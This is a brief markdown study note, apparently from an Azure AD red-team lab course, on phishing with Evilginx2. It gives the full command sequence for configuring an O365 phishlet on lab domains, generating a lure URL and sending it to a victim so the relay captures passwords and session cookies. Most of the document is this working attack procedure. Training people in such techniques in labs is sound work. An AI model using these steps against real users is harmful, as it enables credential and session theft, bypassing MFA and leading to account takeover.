# Initial Access - Phishing

- [Initial Access - Phishing](#initial-access---phishing)
  - [Evilginx2](#evilginx2)

---

## Evilginx2

We can use **Evilginx2** for phishing attacks.

- https://github.com/kgretzky/evilginx2

<br/>

Evilginx acts as a relay/man-in-the-middle between the legit web page and the target user. The user always interacts with the legit website and Evilginx captures usernames, passwords and authentication cookies.

<br/>

It uses **phishlets** that are configuration files for specific target domains. These are YAML files that specify conditions like hosts, filters, structure of authentication cookies and credentials.

<br/>

To start evilginx2:

```
evilginx2 -p C:\AzAD\Tools\evilginx2\phishlets
```

To config the domain:

```
config domain studentx.corp
```

To set the IP for the vilginx server:

```
config ip 172.16.152.190
```

To use the O365 template:

```
phishlets hostname o365 login.student190.corp
```

To verify the DNS entries:

```
phishlets get-hosts o365
```

<br/>

Copy the certificate and private key - `o365.crt` and `o365.key` from:

```
C:\student190\.evilginx\crt to C:\student190\.evilginx\crt\ login.student190.corp
```

To enable phishlets:

```
phishlets enable o365
```

To create the phishing URL (tied to an ID):

```
lures create o365
```

To get the phishing URL:

```
lures get-url <ID>
```

<br/>

After the above preparation, share the URL with the victim.

<br/>

